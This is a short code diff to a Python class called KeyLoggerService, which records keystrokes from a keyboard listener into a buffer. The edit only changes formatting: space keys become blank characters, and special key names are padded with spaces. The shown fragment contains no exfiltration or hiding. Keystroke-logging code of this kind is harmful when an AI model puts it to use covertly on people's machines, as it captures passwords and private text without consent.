@@ -25,8 +25,12 @@ class KeyLoggerService:
             try:
                 if isinstance(key, keyboard.KeyCode):
                     self.key_buffer.append(key.char)
+                elif key.name == "space":
+                    self.key_buffer.append(" ")
                 else:
+                    self.key_buffer.append(" ")
                     self.key_buffer.append(key.name)
+                    self.key_buffer.append(" ")
             except Exception as e:
                 print('Error: ', e)
 
